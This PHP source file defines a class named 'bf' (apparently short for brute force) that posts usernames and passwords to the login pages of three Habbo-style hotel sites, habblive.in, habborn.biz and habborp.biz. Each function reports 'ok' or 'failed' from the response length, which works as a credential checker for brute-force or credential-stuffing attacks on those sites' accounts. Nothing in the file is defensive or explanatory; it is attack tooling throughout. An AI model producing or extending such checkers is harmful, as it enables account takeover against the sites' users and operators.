<?php

include_once ("log.php");
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

class bf
{
    public static function SendPost($url, $data_post)
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data_post));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $opt = curl_exec($ch);
        return $opt;
    }
    public static function SendGet($url)
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        return $output;
    }

    public static function habblive($username, $password)
    {
        $url = "https://habblive.in/";
        $post_data = [
          'username' => $username,
          'password' => $password,
        ];

        $chk = self::SendPost($url, $post_data);

        if(strlen($chk) < 1)
        {
            return "ok";
        }
        else
        {
            return "failed";
        }

    }

    public static function habborn($username, $password) 
    {
        $url_born = "https://habborn.biz/";
        $post_data_born = [
            'username' => $username,
            'password' => $password,
        ];

        $cheke = self::SendPost($url_born, $post_data_born);
        if(strlen($cheke) < 1) 
        {
            return "ok";
        }
        else 
        {
            return "failed";
        }
    }

    public static function habborp($username, $password) 
    {
        $url_hrp = "https://habborp.biz/index";
        $post_data_hrp = [
            'log_username' => $username,
            'remember' => 1,
            'log_password' => $password,
            'login' => '',
        ];
        
        $checker = self::SendPost($url_hrp, $post_data_hrp);

        if(strlen($checker) < 1)
        {
            return "ok";
        }
        else 
        {
            return "failed";
        }
    }
}


?>
